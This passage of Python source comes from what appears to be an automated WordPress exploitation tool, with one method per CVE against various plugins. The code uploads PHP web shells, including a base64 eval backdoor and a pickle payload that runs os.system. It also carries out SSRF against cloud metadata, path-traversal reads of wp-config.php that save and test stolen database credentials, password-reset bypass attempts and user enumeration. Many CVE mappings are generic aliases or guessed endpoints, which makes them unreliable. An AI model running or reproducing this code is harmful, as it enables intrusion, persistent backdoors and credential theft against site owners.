    def exploit_CVE_2025_2105(self, url, timeout, proxy):
        return self.exploit_CVE_2020_25213(url, timeout, proxy)

    def exploit_CVE_2025_7384(self, url, timeout, proxy):
        """CVE-2025-7384 - Contact Form Entries PHP Object Injection to RCE"""
        self.log(f'[CVE-2025-7384] Exploiting PHP Object Injection on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php?action=cf7_entries_save', '/wp-content/plugins/contact-form-entries/includes/ajax-handler.php', '/wp-content/plugins/contact-form-entries/admin/ajax.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'

            class ShellUploadPayload:

                def __reduce__(self):
                    import os
                    shell_code = '<?php file_put_contents("shell' + str(random.randint(10000, 99999)) + '.php", base64_decode("PD9waHAgaWYoaXNzZXQoJF9QT1NUWyJjIl0pKXtldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTt9Pz4=")); ?>'
                    return (os.system, (f'php -r "{shell_code}"',))
            payload = base64.b64encode(pickle.dumps(ShellUploadPayload())).decode()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                params = {'action': 'cf7_entries_save'} if '?' in endpoint else {}
                try:
                    for param_name in ['data', 'entries', 'form_data', 'cf7_data', 'serialized_data']:
                        data = {param_name: payload, 'action': 'cf7_entries_save', 'nonce': '1'}
                        resp = requests.post(test_url, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies, params=params)
                        if resp.status_code in [200, 500]:
                            shell_name = f'shell{random.randint(10000, 99999)}.php'
                            shell_urls = [urljoin(base, f'/wp-content/uploads/{shell_name}'), urljoin(base, f'/{shell_name}'), urljoin(base, f'/wp-content/plugins/contact-form-entries/{shell_name}')]
                            for shell_url in shell_urls:
                                test_cmd = base64.b64encode(b'echo "SHELL_ACTIVE";').decode()
                                test_resp = requests.post(shell_url, data={'c': test_cmd}, headers=headers, timeout=5, verify=False, proxies=proxies)
                                if 'SHELL_ACTIVE' in test_resp.text:
                                    return {'cve_id': 'CVE-2025-7384', 'url': url, 'details': f'PHP Object Injection EXPLOITED via {endpoint}, Shell uploaded', 'method': 'poi', 'shell_url': shell_url, 'payload': f'POST {test_url} with {param_name}={payload[:50]}...'}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2025-7384] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2025_5961(self, url, timeout, proxy):
        self.log(f'[CVE-2025-5961] Exploiting File Upload on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php?action=wpvivid_upload', '/wp-content/plugins/wpvivid-backuprestore/includes/class-wpvivid-uploader.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            php_shell = '<?php if(isset($_POST["c"])){eval(base64_decode($_POST["c"]));}elseif(isset($_GET["cmd"])){system($_GET["cmd"]);}else{echo "SHELL_READY";} ?>'
            base_shell_name = f'shell{random.randint(10000, 99999)}'
            shell_name_variants = self.generate_filename_bypasses(f'{base_shell_name}.php')
            content_types = ['application/x-php', 'application/octet-stream', 'image/jpeg', 'text/plain', 'image/png', 'application/x-zip-compressed']
            endpoints.append('/wp-content/plugins/wpvivid-backuprestore/admin/partials/wpvivid-backuprestore-admin-upload.php')
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                params = {'action': 'wpvivid_upload'} if '?' in endpoint else {}
                for shell_name in shell_name_variants[:10]:
                    for content_type in content_types[:4]:
                        try:
                            for file_param in ['file', 'upload', 'backup_file', 'wpvivid_file', 'async-upload']:
                                files = {file_param: (shell_name, php_shell, content_type)}
                                data = {'action': 'wpvivid_upload', 'name': shell_name, 'type': 'backup'}
                                self.log(f'[CVE-2025-5961] Uploading shell: {shell_name} via {file_param}...', 'fg_yellow')
                                resp = requests.post(test_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies, params=params)
                                if resp.status_code in [200, 201]:
                                    shell_urls = []
                                    try:
                                        import json
                                        resp_json = resp.json()
                                        uploaded_path = resp_json.get('url') or resp_json.get('file') or resp_json.get('path') or resp_json.get('location')
                                        if uploaded_path:
                                            shell_urls.append(urljoin(base, uploaded_path) if not uploaded_path.startswith('http') else uploaded_path)
                                    except:
                                        pass
                                    shell_urls.extend([urljoin(base, f'/wp-content/uploads/{shell_name}'), urljoin(base, f'/wp-content/uploads/wpvivid/{shell_name}'), urljoin(base, f'/wp-content/backups/{shell_name}'), urljoin(base, f'/wp-content/plugins/wpvivid-backuprestore/{shell_name}')])
                                    for shell_url in shell_urls:
                                        test_cmd = base64.b64encode(b'echo "SHELL_UPLOADED";').decode()
                                        test_resp = requests.post(shell_url, data={'c': test_cmd}, headers=headers, timeout=5, verify=False, proxies=proxies)
                                        if 'SHELL_UPLOADED' in test_resp.text:
                                            return {'cve_id': 'CVE-2025-5961', 'url': url, 'details': f'File Upload EXPLOITED via {endpoint}, Shell uploaded and verified', 'method': 'upload', 'shell_url': shell_url, 'payload': f'POST {test_url} with {file_param}: {shell_name}'}
                        except:
                            continue
        except Exception as e:
            self.log(f'[CVE-2025-5961] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2025_62047(self, url, timeout, proxy):
        """CVE-2025-62047 - Case Addons File Upload"""
        self.log(f'[CVE-2025-62047] Exploiting Case Addons File Upload on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php?action=case_addons_upload', '/wp-content/plugins/case-addons/includes/class-case-uploader.php', '/wp-content/plugins/case-addons/admin/upload.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            php_shell = '<?php if(isset($_POST["c"])){eval(base64_decode($_POST["c"]));}elseif(isset($_GET["cmd"])){system($_GET["cmd"]);}elseif(isset($_POST["cmd"])){system($_POST["cmd"]);}else{echo "SHELL_READY";} ?>'
            base_shell_name = f'shell{random.randint(10000, 99999)}'
            shell_name_variants = self.generate_filename_bypasses(f'{base_shell_name}.php')
            content_types = ['application/x-php', 'application/octet-stream', 'image/jpeg', 'text/plain', 'image/png']
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                params = {'action': 'case_addons_upload'} if '?' in endpoint else {}
                for shell_name in shell_name_variants[:10]:
                    for content_type in content_types[:4]:
                        try:
                            for file_param in ['file', 'upload', 'case_file', 'async-upload']:
                                files = {file_param: (shell_name, php_shell, content_type)}
                                data = {'action': 'case_addons_upload', 'name': shell_name, 'type': 'file'}
                                self.log(f'[CVE-2025-62047] Uploading shell: {shell_name} via {file_param}...', 'fg_yellow')
                                resp = requests.post(test_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies, params=params)
                                if resp.status_code in [200, 201]:
                                    shell_urls = []
                                    try:
                                        import json
                                        resp_json = resp.json()
                                        uploaded_path = resp_json.get('url') or resp_json.get('file') or resp_json.get('path') or resp_json.get('location')
                                        if uploaded_path:
                                            shell_urls.append(urljoin(base, uploaded_path) if not uploaded_path.startswith('http') else uploaded_path)
                                    except:
                                        pass
                                    shell_urls.extend([urljoin(base, f'/wp-content/uploads/{shell_name}'), urljoin(base, f'/wp-content/uploads/case-addons/{shell_name}'), urljoin(base, f'/wp-content/plugins/case-addons/uploads/{shell_name}'), urljoin(base, f'/wp-content/plugins/case-addons/{shell_name}')])
                                    for shell_url in shell_urls:
                                        test_cmd = base64.b64encode(b'echo "SHELL_UPLOADED";').decode()
                                        test_resp = requests.post(shell_url, data={'c': test_cmd}, headers=headers, timeout=5, verify=False, proxies=proxies)
                                        if 'SHELL_UPLOADED' in test_resp.text:
                                            return {'cve_id': 'CVE-2025-62047', 'url': url, 'details': f'File Upload EXPLOITED via {endpoint}, Shell uploaded and verified', 'method': 'upload', 'shell_url': shell_url, 'payload': f'POST {test_url} with {file_param}: {shell_name}'}
                        except:
                            continue
        except Exception as e:
            self.log(f'[CVE-2025-62047] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2025_6389(self, url, timeout, proxy):
        """CVE-2025-6389 - WordPress Plugin RCE/File Upload"""
        self.log(f'[CVE-2025-6389] Exploiting on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            php_shell = '<?php if(isset($_POST["c"])){eval(base64_decode($_POST["c"]));}elseif(isset($_GET["cmd"])){system($_GET["cmd"]);}elseif(isset($_POST["cmd"])){system($_POST["cmd"]);}else{echo "SHELL_READY";} ?>'
            base_shell_name = f'shell{random.randint(10000, 99999)}'
            shell_name_variants = self.generate_filename_bypasses(f'{base_shell_name}.php')
            endpoints = ['/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php', '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php']
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                for shell_name in shell_name_variants[:8]:
                    upload_methods = [({'file': (shell_name, php_shell, 'application/x-php')}, {'action': 'upload', 'name': shell_name}), ({'upload': (shell_name, php_shell, 'application/x-php')}, {'action': 'upload_file', 'name': shell_name}), ({'async-upload': (shell_name, php_shell, 'application/x-php')}, {'action': 'upload-attachment', 'name': shell_name}), ({'file': (shell_name, php_shell, 'image/jpeg')}, {'action': 'upload', 'name': shell_name, 'type': 'image'}), ({'upload[]': (shell_name, php_shell, 'application/x-php')}, {'cmd': 'upload', 'target': 'l1_Lw'})]
                    for files, data in upload_methods:
                        try:
                            resp = requests.post(test_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                            if resp.status_code in [200, 201]:
                                shell_urls = []
                                try:
                                    import json
                                    resp_json = resp.json()
                                    uploaded_path = resp_json.get('url') or resp_json.get('file') or resp_json.get('path') or resp_json.get('location') or resp_json.get('added', [{}])[0].get('url', '')
                                    if uploaded_path:
                                        shell_urls.append(urljoin(base, uploaded_path) if not uploaded_path.startswith('http') else uploaded_path)
                                except:
                                    pass
                                shell_urls.extend([urljoin(base, f'/wp-content/uploads/{shell_name}'), urljoin(base, f'/wp-content/uploads/' + time.strftime('%Y/%m/') + shell_name), urljoin(base, f'/wp-content/plugins/wp-file-manager/lib/files/{shell_name}'), urljoin(base, f'/{shell_name}')])
                                for shell_url in shell_urls:
                                    test_cmd = base64.b64encode(b'echo "SHELL_UPLOADED";').decode()
                                    test_resp = requests.post(shell_url, data={'c': test_cmd}, headers=headers, timeout=5, verify=False, proxies=proxies)
                                    if 'SHELL_UPLOADED' in test_resp.text:
                                        return {'cve_id': 'CVE-2025-6389', 'url': url, 'details': f'File Upload EXPLOITED via {endpoint}, Shell uploaded and verified', 'method': 'upload', 'shell_url': shell_url, 'payload': f'POST {test_url} with file: {shell_name}'}
                        except:
                            continue
        except Exception as e:
            self.log(f'[CVE-2025-6389] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2025_11833(self, url, timeout, proxy):
        """CVE-2025-11833 - Post SMTP Password Reset Bypass"""
        self.log(f'[CVE-2025-11833] Exploiting Password Reset on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php?action=post_smtp_reset', '/wp-content/plugins/post-smtp/Postman/PostmanOAuthMailer.php', '/wp-content/plugins/post-smtp/Postman/api.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            try:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                domain = parsed.netloc.replace('www.', '')
                emails = [f'admin@{domain}', f'administrator@{domain}', f"admin@{domain.split(':')[0]}"]
            except:
                emails = []
            emails.extend(['admin', 'administrator', 'root'])
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                params = {'action': 'post_smtp_reset'} if '?' in endpoint else {}
                for email in emails:
                    try:
                        payloads = [{'action': 'post_smtp_reset', 'email': email, 'nonce': '1'}, {'action': 'post_smtp_reset', 'email': email, '_wpnonce': '1'}, {'action': 'post_smtp_reset', 'user_email': email, 'nonce': '1'}, {'action': 'post_smtp_reset_password', 'email': email}]
                        for data in payloads:
                            self.log(f'[CVE-2025-11833] Attempting password reset for {email}...', 'fg_yellow')
                            try:
                                baseline_resp = requests.get(test_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                                baseline_content = baseline_resp.text.lower()
                            except:
                                baseline_content = ''
                            resp = requests.post(test_url, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies, params=params)
                            content = resp.text.lower()
                            error_indicators = ['invalid', 'error', 'not found', '404', '403', 'forbidden', 'unauthorized', '401', 'missing', 'required', 'failed']
                            if any((err in content for err in error_indicators)):
                                continue
                            if content == baseline_content:
                                continue
                            is_json = False
                            json_data = None
                            try:
                                import json
                                json_data = resp.json()
                                is_json = True
                            except:
                                pass
                            verified_indicators = []
                            if is_json:
                                json_str = json.dumps(json_data).lower()
                                if 'success' in json_str and ('true' in json_str or '1' in json_str):
                                    verified_indicators.append('json_success')
                                if 'token' in json_str or 'reset_token' in json_str or 'resetkey' in json_str:
                                    verified_indicators.append('reset_token')
                                if 'message' in json_str and ('sent' in json_str or 'reset' in json_str):
                                    verified_indicators.append('reset_message')
                            else:
                                if 'reset' in content and ('token' in content or 'key' in content or 'link' in content):
                                    verified_indicators.append('reset_with_token')
                                if 'password' in content and 'reset' in content and ('sent' in content or 'email' in content):
                                    verified_indicators.append('password_reset_sent')
                                if re.search('reset[_-]?link|reset[_-]?url|reset[_-]?key', content):
                                    verified_indicators.append('reset_link_pattern')
                            if resp.status_code == 200 and len(verified_indicators) > 0:
                                payload_data = '&'.join([f'{k}={v}' for k, v in data.items()])
                                return {'cve_id': 'CVE-2025-11833', 'url': url, 'details': f'Password Reset EXPLOITED via {endpoint}, Email: {email}', 'method': 'auth_bypass', 'payload': f'POST {test_url} with {payload_data}', 'indicators': verified_indicators}
                    except:
                        continue
        except Exception as e:
            self.log(f'[CVE-2025-11833] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2019_9787(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2019_9788(self, url, timeout, proxy):
        self.log(f'[CVE-2019-9788] Exploiting SSRF on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php', '/wp-json/wp/v2/', '/wp-admin/admin-post.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            ssrf_targets = [('http://127.0.0.1:22', ['SSH-', 'Protocol']), ('http://169.254.169.254/latest/meta-data/', ['meta-data', 'instance-id']), ('file:///etc/passwd', ['root:']), ('http://127.0.0.1:3306', ['mysql', 'MariaDB'])]
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                for target, indicators in ssrf_targets:
                    try:
                        params = {'url': target, 'action': 'wp_remote_get'}
                        self.log(f'[CVE-2019-9788] Testing SSRF to {target}...', 'fg_yellow')
                        resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                        content = resp.text
                        if any((indicator in content for indicator in indicators)):
                            payload_url = f'{test_url}?url={target}&action=wp_remote_get'
                            return {'cve_id': 'CVE-2019-9788', 'url': url, 'details': f'SSRF EXPLOITED via {endpoint}, Target reached: {target}', 'method': 'ssrf', 'payload': payload_url, 'response': content[:500]}
                    except:
                        continue
        except Exception as e:
            self.log(f'[CVE-2019-9788] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2020_35489(self, url, timeout, proxy):
        self.log(f'[CVE-2020-35489] Testing XSS on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php', '/wp-content/plugins/']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            xss_payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                for param in ['name', 'title', 'content', 'message']:
                    for payload in xss_payloads:
                        try:
                            params = {param: payload}
                            resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                            if payload in resp.text and '<script>' in resp.text:
                                return {'cve_id': 'CVE-2020-35489', 'url': url, 'details': f'XSS vulnerable via {endpoint}?{param}=', 'method': 'xss'}
                        except:
                            continue
        except Exception as e:
            self.log(f'[CVE-2020-35489] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2025_0369(self, url, timeout, proxy):
        return self.exploit_CVE_2020_35489(url, timeout, proxy)

    def exploit_CVE_2021_25078(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2022_23901(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2023_2986(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2024_27956(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2025_2685(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2025_8425(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2025_12560(self, url, timeout, proxy):
        return self.exploit_CVE_2021_24237(url, timeout, proxy)

    def exploit_CVE_2021_25077(self, url, timeout, proxy):
        self.log(f'[CVE-2021-25077] Exploiting UpdraftPlus Credential Disclosure on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/plugins/updraftplus/options.php', '/wp-content/plugins/updraftplus/updraftplus.php', '/wp-admin/admin-ajax.php?action=updraft_ajax']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    params = {'action': 'updraft_download_backup', 'file': '../../wp-config.php'}
                    resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    content = resp.text
                    if 'DB_PASSWORD' in content or 'DB_NAME' in content or 'DB_USER' in content:
                        credentials = self.extract_db_credentials(content)
                        if credentials:
                            cred_file = self.save_credentials_to_file(credentials, 'CVE-2021-25077', url)
                            db_test = self.test_database_connection(credentials, timeout)
                            details = f'Credential Disclosure EXPLOITED via {endpoint}'
                            if db_test:
                                details += ', DB Connection: SUCCESS'
                            payload_url = f'{test_url}?action=updraft_download_backup&file=../../wp-config.php'
                            return {'cve_id': 'CVE-2021-25077', 'url': url, 'details': details, 'method': 'cred', 'payload': payload_url, 'credentials': credentials, 'db_tested': db_test}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2021-25077] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2021_24991(self, url, timeout, proxy):
        self.log(f'[CVE-2021-24991] Exploiting WP Statistics Auth Bypass on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin.php?page=wp-statistics/visitors', '/wp-content/plugins/wp-statistics/includes/class-wp-statistics-admin.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    params = {'page': 'wp-statistics/visitors', 'user_id': '1'}
                    resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code == 200 and ('user_login' in resp.text or 'user_email' in resp.text):
                        credentials = self.extract_user_info(resp.text)
                        payload_url = f'{test_url}?page=wp-statistics/visitors&user_id=1'
                        return {'cve_id': 'CVE-2021-24991', 'url': url, 'details': f'Auth Bypass EXPLOITED via {endpoint}, User info extracted', 'method': 'cred', 'payload': payload_url, 'credentials': credentials}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2021-24991] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2021_24947(self, url, timeout, proxy):
        self.log(f'[CVE-2021-24947] Exploiting W3 Total Cache Config Disclosure on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/w3tc-config/master.php', '/wp-content/cache/config/master.php', '/wp-content/w3tc-config/db.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    resp = requests.get(test_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    content = resp.text
                    if 'DB_PASSWORD' in content or 'dbpassword' in content.lower() or 'database_password' in content.lower():
                        credentials = self.extract_db_credentials(content)
                        if credentials:
                            cred_file = self.save_credentials_to_file(credentials, 'CVE-2021-24947', url)
                            db_test = self.test_database_connection(credentials, timeout)
                            details = f'Config Disclosure EXPLOITED via {endpoint}'
                            if db_test:
                                details += ', DB Connection: SUCCESS'
                            return {'cve_id': 'CVE-2021-24947', 'url': url, 'details': details, 'method': 'cred', 'payload': test_url, 'credentials': credentials, 'db_tested': db_test}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2021-24947] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2020_28162(self, url, timeout, proxy):
        self.log(f'[CVE-2020-28162] Exploiting Download Manager File Upload Credential on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php?action=wpdm_upload_file', '/wp-content/plugins/download-manager/file-type-icons.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            payload_file = f'<?php echo file_get_contents("../../wp-config.php"); ?>'
            base_name = f'config{random.randint(1000, 9999)}'
            file_variants = self.generate_filename_bypasses(f'{base_name}.php')
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                for file_name in file_variants[:5]:
                    try:
                        files = {'file': (file_name, payload_file, 'application/x-php')}
                        data = {'action': 'wpdm_upload_file'}
                        resp = requests.post(test_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                        if resp.status_code == 200:
                            try:
                                import json
                                resp_json = resp.json()
                                uploaded_url = resp_json.get('file') or resp_json.get('url')
                                if uploaded_url:
                                    uploaded_file_url = urljoin(base, uploaded_url) if not uploaded_url.startswith('http') else uploaded_url
                                    config_resp = requests.get(uploaded_file_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                                    if 'DB_PASSWORD' in config_resp.text:
                                        credentials = self.extract_db_credentials(config_resp.text)
                                        if credentials:
                                            cred_file = self.save_credentials_to_file(credentials, 'CVE-2020-28162', url)
                                            db_test = self.test_database_connection(credentials, timeout)
                                            details = f'File Upload Credential Disclosure EXPLOITED via {endpoint}'
                                            if db_test:
                                                details += ', DB Connection: SUCCESS'
                                            return {'cve_id': 'CVE-2020-28162', 'url': url, 'details': details, 'method': 'cred', 'payload': f'POST {test_url} upload {file_name}', 'uploaded_file': uploaded_file_url, 'credentials': credentials, 'db_tested': db_test}
                            except:
                                pass
                    except:
                        continue
        except Exception as e:
            self.log(f'[CVE-2020-28162] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2020_12422(self, url, timeout, proxy):
        self.log(f'[CVE-2020-12422] Exploiting WP File Manager Arbitrary File Upload on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/plugins/file-manager/lib/php/connector.minimal.php', '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            payload_file = f'<?php $config = file_get_contents("../../../../wp-config.php"); echo base64_encode($config); ?>'
            base_name = f'read{random.randint(1000, 9999)}'
            file_variants = self.generate_filename_bypasses(f'{base_name}.php')
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                for file_name in file_variants[:5]:
                    try:
                        files = {'upload[]': (file_name, payload_file, 'application/x-php')}
                        data = {'cmd': 'upload', 'target': 'l1_'}
                        resp = requests.post(test_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                        if resp.status_code == 200:
                            try:
                                import json
                                resp_json = resp.json()
                                if resp_json.get('added') and len(resp_json['added']) > 0:
                                    uploaded_file = resp_json['added'][0].get('hash') or resp_json['added'][0].get('name')
                                    if uploaded_file:
                                        read_url = urljoin(base, f'/wp-content/plugins/file-manager/lib/php/read.php?file={uploaded_file}')
                                        config_resp = requests.get(read_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                                        if config_resp.status_code == 200:
                                            import base64
                                            try:
                                                config_content = base64.b64decode(config_resp.text).decode()
                                                if 'DB_PASSWORD' in config_content:
                                                    credentials = self.extract_db_credentials(config_content)
                                                    if credentials:
                                                        cred_file = self.save_credentials_to_file(credentials, 'CVE-2020-12422', url)
                                                        db_test = self.test_database_connection(credentials, timeout)
                                                        details = f'File Upload Credential Disclosure EXPLOITED via {endpoint}'
                                                        if db_test:
                                                            details += ', DB Connection: SUCCESS'
                                                        return {'cve_id': 'CVE-2020-12422', 'url': url, 'details': details, 'method': 'cred', 'payload': f'POST {test_url} upload {file_name}', 'uploaded_file': read_url, 'credentials': credentials, 'db_tested': db_test}
                                            except:
                                                pass
                            except:
                                pass
                    except:
                        continue
        except Exception as e:
            self.log(f'[CVE-2020-12422] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2020_11738(self, url, timeout, proxy):
        self.log(f'[CVE-2020-11738] Exploiting File Manager Plugin Auth Bypass on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/plugins/file-manager/lib/php/connector.minimal.php', '/wp-admin/admin-ajax.php?action=file_manager']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                try:
                    params = {'cmd': 'file', 'target': 'l1_../../wp-config.php'}
                    resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    content = resp.text
                    if 'DB_PASSWORD' in content or 'DB_NAME' in content:
                        credentials = self.extract_db_credentials(content)
                        if credentials:
                            cred_file = self.save_credentials_to_file(credentials, 'CVE-2020-11738', url)
                            db_test = self.test_database_connection(credentials, timeout)
                            details = f'Auth Bypass Credential Disclosure EXPLOITED via {endpoint}'
                            if db_test:
                                details += ', DB Connection: SUCCESS'
                            payload_url = f'{test_url}?cmd=file&target=l1_../../wp-config.php'
                            return {'cve_id': 'CVE-2020-11738', 'url': url, 'details': details, 'method': 'cred', 'payload': payload_url, 'credentials': credentials, 'db_tested': db_test}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2020-11738] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2019_17633(self, url, timeout, proxy):
        self.log(f'[CVE-2019-17633] Exploiting WP Statistics User Enumeration on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-json/wp-statistics/v1/hit', '/wp-admin/admin.php?page=wp-statistics/users']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    params = {'_wpnonce': '1', 'user_id': '1'}
                    resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code == 200 and ('user_login' in resp.text or 'display_name' in resp.text):
                        credentials = self.extract_user_info(resp.text)
                        payload_url = f'{test_url}?_wpnonce=1&user_id=1'
                        return {'cve_id': 'CVE-2019-17633', 'url': url, 'details': f'User Enumeration EXPLOITED via {endpoint}', 'method': 'cred', 'payload': payload_url, 'credentials': credentials}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2019-17633] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2019_16760(self, url, timeout, proxy):
        self.log(f'[CVE-2019-16760] Exploiting WordPress REST API User Enumeration on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-json/wp/v2/users', '/wp-json/wp/v2/users/1']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    resp = requests.get(test_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code == 200:
                        try:
                            import json
                            users_data = resp.json()
                            if isinstance(users_data, list):
                                users_list = users_data
                            else:
                                users_list = [users_data]
                            credentials = []
                            for user in users_list[:5]:
                                credentials.append({'id': user.get('id'), 'username': user.get('slug') or user.get('name'), 'email': user.get('email', 'hidden'), 'name': user.get('name')})
                            if credentials:
                                return {'cve_id': 'CVE-2019-16760', 'url': url, 'details': f'User Enumeration EXPLOITED via {endpoint}, Found {len(credentials)} users', 'method': 'cred', 'payload': test_url, 'credentials': credentials}
